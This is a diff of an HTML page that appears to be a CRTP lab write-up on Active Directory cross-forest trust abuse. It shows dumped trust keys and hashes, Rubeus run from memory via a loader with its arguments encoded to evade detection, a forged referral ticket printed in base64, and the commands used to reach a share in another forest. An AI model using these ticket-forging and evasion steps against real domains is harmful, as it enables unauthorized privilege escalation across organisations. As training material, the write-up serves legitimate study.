-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">f0326d8925998e62132cad216e7db7ed</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">03a60f8686b725b4b335971d5eb3b744</span>
+Domain: US.DOLLARCORP.MONEYCORP.LOCAL (US / S-1-5-21-1028785420-4100948154-1806204659)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -&gt; US.DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:05 AM - CLEAR   - 97 f8 65 53 4a 83 9e 27 46 ce 48 dd b2 e1 b8 c9 ee bd 76 ba 6b 5e 68 51 3a ab 16 3f
+        * aes256_hmac       d594bdbdf43f709b7c17755c51723d982d6ced1d2929fbd3ea9edab82b35d4c1
+        * aes128_hmac       f0326d8925998e62132cad216e7db7ed
+        * rc4_hmac_nt       03a60f8686b725b4b335971d5eb3b744
 
- <span class="p">[</span> <span class="n">Out</span> <span class="p">]</span> <span class="n">US</span><span class="p">.</span><span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">23</span><span class="p">:</span><span class="n">05</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">97</span> <span class="n">f8</span> <span class="n">65</span> <span class="n">53</span> <span class="n">4a</span> <span class="n">83</span> <span class="n">9e</span> <span class="n">27</span> <span class="n">46</span> <span class="n">ce</span> <span class="n">48</span> <span class="n">dd</span> <span class="n">b2</span> <span class="n">e1</span> <span class="n">b8</span> <span class="n">c9</span> <span class="n">ee</span> <span class="n">bd</span> <span class="n">76</span> <span class="n">ba</span> <span class="n">6b</span> <span class="n">5e</span> <span class="n">68</span> <span class="n">51</span> <span class="n">3a</span> <span class="n">ab</span> <span class="n">16</span> <span class="n">3f</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">93545f14dd1e166acfbe9c1bc16b4681c14a5c47b1eecff141b3dfa750ce6155</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">fd73c2b0e77cf05cd0fc87d60fa3586a</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">03a60f8686b725b4b335971d5eb3b744</span>
+ [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:05 AM - CLEAR   - 97 f8 65 53 4a 83 9e 27 46 ce 48 dd b2 e1 b8 c9 ee bd 76 ba 6b 5e 68 51 3a ab 16 3f
+        * aes256_hmac       93545f14dd1e166acfbe9c1bc16b4681c14a5c47b1eecff141b3dfa750ce6155
+        * aes128_hmac       fd73c2b0e77cf05cd0fc87d60fa3586a
+        * rc4_hmac_nt       03a60f8686b725b4b335971d5eb3b744
 
- <span class="p">[</span> <span class="k">In</span><span class="p">-</span><span class="n">1</span><span class="p">]</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">US</span><span class="p">.</span><span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">23</span><span class="p">:</span><span class="n">00</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">dd</span> <span class="n">1f</span> <span class="n">44</span> <span class="n">bb</span> <span class="n">0b</span> <span class="n">3f</span> <span class="n">4c</span> <span class="n">b3</span> <span class="n">34</span> <span class="n">d8</span> <span class="n">d3</span> <span class="n">70</span> <span class="n">7b</span> <span class="n">45</span> <span class="n">33</span> <span class="n">d5</span> <span class="n">02</span> <span class="n">3a</span> <span class="n">e1</span> <span class="n">0a</span> <span class="n">b3</span> <span class="n">e6</span> <span class="n">46</span> <span class="n">b6</span> <span class="n">e0</span> <span class="n">6b</span> <span class="n">5f</span> <span class="n">ba</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">ac334d01cf7e0c05beb73c1fe9a7ca4a89305ebb12c4a5a9c9e9f0fdac234797</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">df2babb6d3e253cc33822ddbabd28262</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">eaeba7f85e8ede955c68372cf2b13a24</span>
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -&gt; US.DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:00 AM - CLEAR   - dd 1f 44 bb 0b 3f 4c b3 34 d8 d3 70 7b 45 33 d5 02 3a e1 0a b3 e6 46 b6 e0 6b 5f ba
+        * aes256_hmac       ac334d01cf7e0c05beb73c1fe9a7ca4a89305ebb12c4a5a9c9e9f0fdac234797
+        * aes128_hmac       df2babb6d3e253cc33822ddbabd28262
+        * rc4_hmac_nt       eaeba7f85e8ede955c68372cf2b13a24
 
- <span class="p">[</span><span class="n">Out</span><span class="p">-</span><span class="n">1</span><span class="p">]</span> <span class="n">US</span><span class="p">.</span><span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">23</span><span class="p">:</span><span class="n">00</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">dd</span> <span class="n">1f</span> <span class="n">44</span> <span class="n">bb</span> <span class="n">0b</span> <span class="n">3f</span> <span class="n">4c</span> <span class="n">b3</span> <span class="n">34</span> <span class="n">d8</span> <span class="n">d3</span> <span class="n">70</span> <span class="n">7b</span> <span class="n">45</span> <span class="n">33</span> <span class="n">d5</span> <span class="n">02</span> <span class="n">3a</span> <span class="n">e1</span> <span class="n">0a</span> <span class="n">b3</span> <span class="n">e6</span> <span class="n">46</span> <span class="n">b6</span> <span class="n">e0</span> <span class="n">6b</span> <span class="n">5f</span> <span class="n">ba</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">a7786e1e0b45adf75c17fb2e92f0643890f49a19d9cea2bca51745d6c4b8b425</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">85ec623f11bed99a5e06b3468330e7e3</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">eaeba7f85e8ede955c68372cf2b13a24</span>
+ [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:00 AM - CLEAR   - dd 1f 44 bb 0b 3f 4c b3 34 d8 d3 70 7b 45 33 d5 02 3a e1 0a b3 e6 46 b6 e0 6b 5f ba
+        * aes256_hmac       a7786e1e0b45adf75c17fb2e92f0643890f49a19d9cea2bca51745d6c4b8b425
+        * aes128_hmac       85ec623f11bed99a5e06b3468330e7e3
+        * rc4_hmac_nt       eaeba7f85e8ede955c68372cf2b13a24
 
-<span class="n">Domain</span><span class="p">:</span> <span class="n">EUROCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">(</span><span class="n">ecorp</span> <span class="p">/</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3333069040</span><span class="p">-</span><span class="n">3914854601</span><span class="p">-</span><span class="n">3606488808</span><span class="p">)</span>
- <span class="p">[</span>  <span class="k">In</span> <span class="p">]</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">EUROCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">23</span><span class="p">:</span><span class="n">10</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">7c</span> <span class="n">6b</span> <span class="n">2a</span> <span class="n">29</span> <span class="n">ab</span> <span class="n">68</span> <span class="n">39</span> <span class="n">5d</span> <span class="n">b4</span> <span class="n">8f</span> <span class="n">e8</span> <span class="n">a7</span> <span class="n">ea</span> <span class="n">03</span> <span class="n">67</span> <span class="n">d8</span> <span class="n">58</span> <span class="n">b9</span> <span class="n">34</span> <span class="n">9c</span> <span class="n">e7</span> <span class="n">e2</span> <span class="n">80</span> <span class="n">dd</span> <span class="n">58</span> <span class="n">96</span> <span class="n">56</span> <span class="n">cc</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">1f6bd80d7e906111d3a8386385f8f107edba618910e390a0fa3a84ba3864e40b</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">fa8a7499a472e0ffecf908711d1399cc</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">d9eafe9914b32d5ffae65b4d049c98f2</span>
 
- <span class="p">[</span> <span class="n">Out</span> <span class="p">]</span> <span class="n">EUROCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">23</span><span class="p">:</span><span class="n">10</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">7c</span> <span class="n">6b</span> <span class="n">2a</span> <span class="n">29</span> <span class="n">ab</span> <span class="n">68</span> <span class="n">39</span> <span class="n">5d</span> <span class="n">b4</span> <span class="n">8f</span> <span class="n">e8</span> <span class="n">a7</span> <span class="n">ea</span> <span class="n">03</span> <span class="n">67</span> <span class="n">d8</span> <span class="n">58</span> <span class="n">b9</span> <span class="n">34</span> <span class="n">9c</span> <span class="n">e7</span> <span class="n">e2</span> <span class="n">80</span> <span class="n">dd</span> <span class="n">58</span> <span class="n">96</span> <span class="n">56</span> <span class="n">cc</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">4c8f562a9d1fb21e67b1efc6b4b134555879e5a84a4691c6c9229ad0acbec941</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">0976e9a059fd0e7ec736b1114eabbe2d</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">d9eafe9914b32d5ffae65b4d049c98f2</span>
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -&gt; EUROCORP.LOCAL
+    * 6/4/2024 6:23:10 AM - CLEAR   - 7c 6b 2a 29 ab 68 39 5d b4 8f e8 a7 ea 03 67 d8 58 b9 34 9c e7 e2 80 dd 58 96 56 cc
+        * aes256_hmac       1f6bd80d7e906111d3a8386385f8f107edba618910e390a0fa3a84ba3864e40b
+        * aes128_hmac       fa8a7499a472e0ffecf908711d1399cc
+        * rc4_hmac_nt       d9eafe9914b32d5ffae65b4d049c98f2
 
- <span class="p">[</span> <span class="k">In</span><span class="p">-</span><span class="n">1</span><span class="p">]</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">EUROCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">22</span><span class="p">:</span><span class="n">59</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">e0</span> <span class="n">2f</span> <span class="n">a2</span> <span class="n">bf</span> <span class="n">2d</span> <span class="n">5a</span> <span class="n">c8</span> <span class="n">6a</span> <span class="n">64</span> <span class="n">2a</span> <span class="n">5d</span> <span class="n">29</span> <span class="n">41</span> <span class="n">9b</span> <span class="n">63</span> <span class="n">96</span> <span class="n">d0</span> <span class="n">8c</span> <span class="n">b1</span> <span class="n">e8</span> <span class="n">60</span> <span class="n">41</span> <span class="n">eb</span> <span class="n">a3</span> <span class="nb">ac </span><span class="n">b3</span> <span class="n">44</span> <span class="n">11</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">da32d30319101bfec097b0fc41cc69067bcb7bae2b0b1659cf955f4c45d3db71</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">8957dda5e5cb54d55e3306134225d463</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">7ec54b13b25f8ea11d0228a7b2e13a44</span>
+ [ Out ] EUROCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:10 AM - CLEAR   - 7c 6b 2a 29 ab 68 39 5d b4 8f e8 a7 ea 03 67 d8 58 b9 34 9c e7 e2 80 dd 58 96 56 cc
+        * aes256_hmac       4c8f562a9d1fb21e67b1efc6b4b134555879e5a84a4691c6c9229ad0acbec941
+        * aes128_hmac       0976e9a059fd0e7ec736b1114eabbe2d
+        * rc4_hmac_nt       d9eafe9914b32d5ffae65b4d049c98f2
 
- <span class="p">[</span><span class="n">Out</span><span class="p">-</span><span class="n">1</span><span class="p">]</span> <span class="n">EUROCORP</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">-&gt;</span> <span class="n">DOLLARCORP</span><span class="p">.</span><span class="n">MONEYCORP</span><span class="p">.</span><span class="n">LOCAL</span>
-    <span class="p">*</span> <span class="n">6</span><span class="p">/</span><span class="n">4</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">22</span><span class="p">:</span><span class="n">59</span> <span class="n">AM</span> <span class="p">-</span> <span class="nb">CLEAR </span>  <span class="p">-</span> <span class="n">e0</span> <span class="n">2f</span> <span class="n">a2</span> <span class="n">bf</span> <span class="n">2d</span> <span class="n">5a</span> <span class="n">c8</span> <span class="n">6a</span> <span class="n">64</span> <span class="n">2a</span> <span class="n">5d</span> <span class="n">29</span> <span class="n">41</span> <span class="n">9b</span> <span class="n">63</span> <span class="n">96</span> <span class="n">d0</span> <span class="n">8c</span> <span class="n">b1</span> <span class="n">e8</span> <span class="n">60</span> <span class="n">41</span> <span class="n">eb</span> <span class="n">a3</span> <span class="nb">ac </span><span class="n">b3</span> <span class="n">44</span> <span class="n">11</span>
-        <span class="p">*</span> <span class="n">aes256_hmac</span>       <span class="n">4f940dc24662174c19836b1f4597640e9de8532bffac3a900d836c3de0d7f965</span>
-        <span class="p">*</span> <span class="n">aes128_hmac</span>       <span class="n">d11ac5344115824ddcef61d3bb093b6d</span>
-        <span class="p">*</span> <span class="n">rc4_hmac_nt</span>       <span class="n">7ec54b13b25f8ea11d0228a7b2e13a44</span>
-</code></pre></div>
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -&gt; EUROCORP.LOCAL
+    * 6/4/2024 6:22:59 AM - CLEAR   - e0 2f a2 bf 2d 5a c8 6a 64 2a 5d 29 41 9b 63 96 d0 8c b1 e8 60 41 eb a3 ac b3 44 11
+        * aes256_hmac       da32d30319101bfec097b0fc41cc69067bcb7bae2b0b1659cf955f4c45d3db71
+        * aes128_hmac       8957dda5e5cb54d55e3306134225d463
+        * rc4_hmac_nt       7ec54b13b25f8ea11d0228a7b2e13a44
 
-<p>Above we can see that we were able to dump all keys/passwords for all associated trusts. Our focus so far is on Cross Forest Trust (I have market the important information as Red in output above).</p>
-<p>Now that we do have the Trusted Key information, we can use Rubeus to forge our ticket with SID-History of Enterprise Admin.
-We will carry on from our attacking machine for now since we already have all the information needed.</p>
-<p>let’s use Argsplit.bat again to encode the word silver, for our Rubeus payload and copy/paste it.</p>
-<p><code>silver</code></p>
-<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
-<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">silver</span>
-<span class="nb">set </span><span class="s2">&quot;z=r&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;y=e&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;x=v&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;w=l&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;v=i&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;u=s&quot;</span>
-<span class="nb">set </span><span class="s2">&quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</span>
-</code></pre></div>
-
-<p>Now we can use PELoader.exe to import Rubeus and execute our payload from the memory.</p>
-<p>Now we will forge a referral ticket. 
-Note that we are not injecting any SID History here as it would be filtered out.</p>
-<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:`` /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap</code></p>
-<div class="highlight"><pre><span></span><code><span class="n">doIGFjCCBhKgAwIBBaEDAgEWooIE4jCCBN5hggTaMIIE1qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBH4wggR6oAMCARehAwIBA6KCBGwEggRodkNxzvz0mEGiKz23RJmxHzwAM5UXK0OIkMVQiwiIw4D7zSw7WMVvMGdKcN1Phg3xrQUoxio5nmWj1ZbRbd12JdvqykrLIOrMGxv9VccSAu217BoidHVpYjOyLJ774dGgyZuWmW2cSFdUlhWjyRgwHO7WSPrmZfzdOwsNHpKBFYQMxRadFWoa939G1UMnoXOf3q00mad7p5W9jkyaa7</span><span class="p">+</span><span class="n">Xuwou7NXVaEU9rG7jGDZe2uLy2nMJkLCTuG</span><span class="p">/</span><span class="n">pVD3rnweDudOEovW8ASTP5ce7vX4</span><span class="p">+/</span><span class="n">QpmRjI8xKeI9rxwgNLYqxeB</span><span class="p">+</span><span class="n">XGrZnOeknxtOF9ttLo40RR</span><span class="p">+</span><span class="n">2WBudy93vXle2BTkaK5XfKth4</span><span class="p">/</span><span class="n">USGSXoQ3bFHwwl6im6TxG</span><span class="p">/</span><span class="n">qr8ReS22HBc0zve4oXLVGGulnON7hCAlUQ58VejJJiHvhZz</span><span class="p">/</span><span class="n">D0</span><span class="p">+</span><span class="n">PoQwBSTRtQ5bVtwg</span><span class="p">+</span><span class="n">KKOCz8sDwAMSxqLILO5bFW19WyF72OIDRbXpEMEOhLMqbNkNSWwr5PQxEoXRofkLZoRq2V1l1iopFRvojjWKUtuOOmbOhadWQIBn</span><span class="p">+</span><span class="n">YxqsDauh</span><span class="p">/</span><span class="n">1h14eJqw94Psz5Hg2fEWOIdO7SoQNMJCZL85JmjDHU2HjPGVF2ZYkGjmhnham700hwTJMpipfWumyI5NUTMmJxCElxzmlQglpc1SpQv4oBMedk35tJVhDZoDQnCyWfAfsAF8D28g5</span><span class="p">+</span><span class="n">4SBopgWpvyR6FrUdMoyW9QtzPIsab9</span><span class="p">/+</span><span class="n">H4scYtxNQyp1NkkPoHuQ3NLBBv6NNZjC</span><span class="p">+</span><span class="n">Yn4TJoobS5wrRyRiK1WFH</span><span class="p">/</span><span class="n">AMSz5RQg3OQE</span><span class="p">/</span><span class="n">ryshLqMd</span><span class="p">+</span><span class="n">8PHNk6xx0TJSAqDheYQQL65R6NurqVYSleF58FPyNwhjFdrCSy7lsNDHKLXfjwVoQ</span><span class="p">+</span><span class="n">Cn6S14stm1CwjEQi1xBMZrrKqUdFN</span><span class="p">+</span><span class="n">BKszuHS7</span><span class="p">/</span><span class="n">O1ekDoIAg</span><span class="p">/</span><span class="n">ckWhb</span><span class="p">/</span><span class="n">Yt</span><span class="p">/</span><span class="n">72i</span><span class="p">/</span><span class="n">7TkNCsPrtIQGlhIgaSBjA8lHDCpnA</span><span class="p">/</span><span class="n">elCihlprFyBEIz564oSJPKYJFL</span><span class="p">+</span><span class="n">svDioT3RR7bbaxIOh</span><span class="p">/</span><span class="n">UXn9PiqiTqEZ1GQORfF</span><span class="p">+</span><span class="n">m</span><span class="p">/</span><span class="n">x2GCRPYytqb</span><span class="p">/</span><span class="n">8AzJiHZeEcAeCZhbdl8wgCuBiYgiBuy7g2I8UKPgrk0kTOWDlccGeTzZqVvTEbHyndu8uPZrylaT</span><span class="p">+</span><span class="n">eB4xOIL</span><span class="p">/</span><span class="n">FZrrlOGS8Ey1ruzHO9EJXgqh1p0PCM8Ny4l4QqFkoB</span><span class="p">+</span><span class="n">FykS7ZRn5TB2ALrkgkwKZPFnnPUt8JQ477AnGqKScpEPNCio5kVflxMEKEOIiWKbfZSPReTqgScRVC31mJiI</span><span class="p">/</span><span class="n">0Yp</span><span class="p">+</span><span class="n">clV</span><span class="p">/</span><span class="n">YzYLCHJlk8ti71iu4SR44sdnhogLkD8l9ivFciSOVDQd0TadtGxYJ7</span><span class="p">+</span><span class="n">BOCnjJp9Gw1z86W7NR0zs8ndSlE3W6LHXNwAjcyWElLjCbMuGHE8Pe5ADgL8g1BTdl0k3hSAqjfgJ</span><span class="p">+</span><span class="n">fkIf9MpzMlJdg5KgbsttcdvDVQcAcrEHudLtLTWKHYHK0cfP</span><span class="p">/</span><span class="n">gfml9p9g</span><span class="p">+</span><span class="n">lV8TbA6msTzW3dxQ5W61usc4Ilv4iiwkJ</span><span class="p">+</span><span class="n">iwT9B</span><span class="p">+</span><span class="n">1amdBPG32dL8oo5wYlo4IBHjCCARqgAwIBAKKCAREEggENfYIBCTCCAQWgggEBMIH</span><span class="p">+</span><span class="n">MIH7oBswGaADAgEXoRIEEBHZG2</span><span class="p">/</span><span class="n">sgaom8GuIb5GIdm6hHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjQwNjE0MjIyNTMyWqURGA8yMDI0MDYxNDIyMjUzMlqmERgPMjAyNDA2MTUwODI1MzJapxEYDzIwMjQwNjIxMjIyNTMyWqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw</span><span class="p">=</span>
-</code></pre></div>
-
-<ol>
-<li>
-<p>/service: This flag specifies the service principal name (SPN) of the service that the ticket is being forged for. In this case, it is krbtgt/dollarcorp.moneycorp.local.</p>
-</li>
-<li>
-<p>/rc4: This flag specifies the RC4 key used to encrypt the ticket(dollarcorp.moneycorp.local). In this case, it is .</p>
-</li>
-<li>
-<p>/sid: This flag specifies the SID of the user or group that the ticket is being forged for. In this case, it is S-1-5-21-719815819-3726368948-3917688648.</p>
-</li>
-<li>
-<p>/ldap: This flag specifies that the ticket should be forged using LDAP.</p>
-</li>
-<li>
-<p>/user: This flag specifies the username of the user that the ticket is being forged for. In this case, it is administrator.</p>
-</li>
-<li>
-<p>/nowrap: This flag specifies that the output should not be wrapped.</p>
-</li>
-<li>
-<p>/ptt: This flag specifies that the ticket should be printed to the console.</p>
-</li>
-</ol>
-<p>This command forges a ticket for the <code>krbtgt/dollarcorp.moneycorp.local</code> service using the RC4 key , the SID <code>S-1-5-21-719815819-3726368948-3917688648</code>. The ticket is forged using LDAP and the username is <code>administrator</code>. The output is not wrapped and the ticket is printed to the console.</p>
-<p><code>C:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGFjCCBhKgAwI…BSE64_SNIPPET</code></p>
-<p>Now if we check our Cached Ticket.</p>
-<p><code>klist</code></p>
-<p>Once the ticket is injected, we can access explicitly shared resources on eurocorp-dc.</p>
-<p><code>dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\</code></p>
-<p>Note that the only way to enumerate accessible resources (service on a machine) in eurocorp would be to request a TGS for each one and then attempt to access it.</p>
+ [Out-1] EUROCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:22:59 AM - CLEAR   - e0 2f a2 bf 2d 5a c8 6a 64 2a 5d 29 41 9b 63 96 d0 8c b1 e8 60 41 eb a3 ac b3 44 11
+        * aes256_hmac       4f940dc24662174c19836b1f4597640e9de8532bffac3a900d836c3de0d7f965
+        * aes128_hmac       d11ac5344115824ddcef61d3bb093b6d
+        * rc4_hmac_nt       7ec54b13b25f8ea11d0228a7b2e13a44</code></pre><p class="" id="30c79e9a-d7c9-8008-9751-d0d89db20d35">Above we can see that we were able to dump all keys/passwords for all associated trusts. Our focus so far is on Cross Forest Trust (I have market the important information as Red in output above).</p><p class="" id="30c79e9a-d7c9-8021-a8e6-d93dc69da7ef">
+</p><p class="" id="30c79e9a-d7c9-80fd-9990-d76c60aa5e19">Now that we do have the Trusted Key information, we can use Rubeus to forge our ticket with SID-History of Enterprise Admin.<br/>We will carry on from our attacking machine for now since we already have all the information needed.</p><p class="" id="30c79e9a-d7c9-80c6-8865-dd8e8ae8c83b">
+</p><p class="" id="30c79e9a-d7c9-80ca-8437-dea39bb68f2a">let’s use Argsplit.bat again to encode the word silver, for our Rubeus payload and copy/paste it.</p><p class="" id="30c79e9a-d7c9-80b9-b023-e3039f595a3e"><code>silver</code></p><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-8061-beee-d1f52dd973ae"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">[!] Argument Limit: 180 characters
+[+] Enter a string: silver
+set "z=r"
+set "y=e"
+set "x=v"
+set "w=l"
+set "v=i"
+set "u=s"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre><p class="" id="30c79e9a-d7c9-809e-831f-e996b218f020">
+</p><p class="" id="30c79e9a-d7c9-800c-888d-f1a0be5a8725">Now we can use PELoader.exe to import Rubeus and execute our payload from the memory.<br/></p><p class="" id="30c79e9a-d7c9-8028-935b-efb06379331f">Now we will forge a referral ticket. <br/>Note that we are not injecting any SID History here as it would be filtered out.</p><p class="" id="30c79e9a-d7c9-8056-8854-fb10921f9e9d">
+</p><p class="" id="30c79e9a-d7c9-8090-ada9-da03e2bb8b7f"><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:</code><code> /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap</code></p><a href="../../assets/crtp/Untitled 132.png"><img src="../../assets/crtp/Untitled 132.png"/></a><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" referrerpolicy="no-referrer" rel="stylesheet"/><pre class="code code-wrap" id="30c79e9a-d7c9-800f-969c-eaa250f75546"><code class="language-PowerShell" 